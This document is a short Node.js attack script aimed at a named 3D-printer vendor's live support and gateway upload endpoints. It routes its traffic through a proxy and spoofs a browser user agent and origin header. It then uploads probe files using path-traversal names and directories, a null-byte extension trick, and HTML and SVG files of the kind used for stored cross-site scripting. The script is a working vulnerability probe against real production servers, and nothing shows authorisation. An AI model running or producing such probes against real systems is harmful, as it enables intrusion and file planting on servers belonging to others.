const {ProxyAgent,fetch}=require('undici');
const d=new ProxyAgent(process.env.HTTPS_PROXY||'http://127.0.0.1:7890');
const UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';
const bases=['https://support.bambulab.com','https://oepa.bblops.com/csm/gateway'];
const names=['probe.txt','../probe.txt','..%2fprobe.txt','....//probe.txt','a\\..\\probe.txt','probe.txt%00.png','probe.html','probe.svg'];
async function up(base,name,content,dir){try{const fd=new FormData();fd.append('file',new Blob([content],{type:name.endsWith('.html')?'text/html':name.endsWith('.svg')?'image/svg+xml':'text/plain'}),name);const url=base+'/file/fileRecord/csm/uploadWithName?systemCode=CSM&bizCode=csm_private&dir='+encodeURIComponent(dir||'im');const r=await fetch(url,{method:'POST',headers:{'user-agent':UA,origin:'https://support.bambulab.com','x-bbl-official-site-region':'EN'},body:fd,dispatcher:d,signal:AbortSignal.timeout(30000)});const t=await r.text();console.log(r.status,base.split('/')[2],name,'dir='+(dir||'im'),'|',t.slice(0,260).replace(/\s+/g,' '));}catch(e){console.log('ERR',name,e.message)}}
(async()=>{
 for(const base of bases){
  console.log('### base',base);
  for(const n of names){await up(base,n,'probe-'+Math.random().toString(36).slice(2),'im');}
  await up(base,'probe.txt','probe','../../etc');await up(base,'probe.txt','probe','im/../../x');await up(base,'probe.txt','probe','..%2f..');
 }
})();
